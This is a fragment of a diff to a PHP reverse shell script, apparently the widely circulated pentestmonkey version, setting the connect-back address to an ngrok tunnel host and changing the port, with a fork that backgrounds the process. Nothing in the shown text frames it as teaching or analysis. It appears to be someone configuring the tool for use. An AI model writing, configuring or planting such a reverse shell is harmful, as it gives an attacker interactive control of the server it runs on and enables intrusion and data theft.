@@ -47,7 +47,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '0.tcp.ngrok.io';  // CHANGE THIS
-$port = 14485;       // CHANGE THIS
+$port = 14155;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -64,12 +64,12 @@ $debug = 0;
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
 	$pid = pcntl_fork();
-	
+
 	if ($pid == -1) {
 		printit("ERROR: Can't fork");
 		exit(1);
 	}
-	
+
 	if ($pid) {
 		exit(0);  // Parent exits
 	}
@@ -186,6 +186,4 @@ function printit ($string) {
 	}
 }
 
-?> 
-
-
+?>
